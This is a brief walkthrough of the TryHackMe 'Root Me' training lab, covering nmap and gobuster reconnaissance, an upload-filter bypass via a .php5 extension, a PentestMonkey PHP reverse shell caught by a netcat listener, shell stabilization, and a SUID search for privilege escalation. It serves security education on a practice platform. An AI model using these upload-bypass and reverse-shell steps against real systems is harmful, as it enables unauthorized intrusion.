# TryHackMe: Root Me Challenge Walkthrough

## Setup

1. Sign up for TryHackMe: https://tryhackme.com
2. Download OpenVPN configuration file from your profile
3. Connect to TryHackMe VPN:
   ```
   sudo openvpn [your-openvpn-config-file].ovpn
   ```

## RootMe Steps

1. Deploy the machine and get the IP address

2. Perform initial recon:
   ```
   nmap -sV -sC -oA nmap_scan_results [IP_ADDRESS]
   ```

3. Check open ports (usually 22 for SSH and 80 for HTTP)

4. Open the IP in a web browser to view the website

5. Run directory enumeration:
   ```
   gobuster dir -u http://[IP_ADDRESS] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   ```

6. Identify upload functionality and restrictions

7. Prepare a PHP reverse shell:
   - Use the PHP reverse shell from PentestMonkey
   - Modify the IP address to your TryHackMe VPN IP
   - Change the port to 1337

8. Rename the PHP file to bypass upload restrictions (e.g., shell.php5)

9. Set up a netcat listener:
   ```
   nc -lvnp 1337
   ```

10. Upload the PHP reverse shell and access it through the /uploads directory

11. Stabilize the shell:
    ```
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```

12. Find and read the user flag:
    ```
    cat /var/www/user.txt
    ```

13. Privilege escalation:
    - Check for SUID binaries:
      ```
      find / -perm -u=s -type f 2>/dev/null
      ```
    - Identify and exploit the vulnerable SUID binary

14. Read the root flag:
    ```
    cat /root/root.txt
    ```

## Tips

- Use `alias ll='ls -la'` for easier directory listing
- Save flags to local files for easy submission
- Always stabilize your shell for better usability

Remember to submit the flags on the TryHackMe platform to complete the challenge!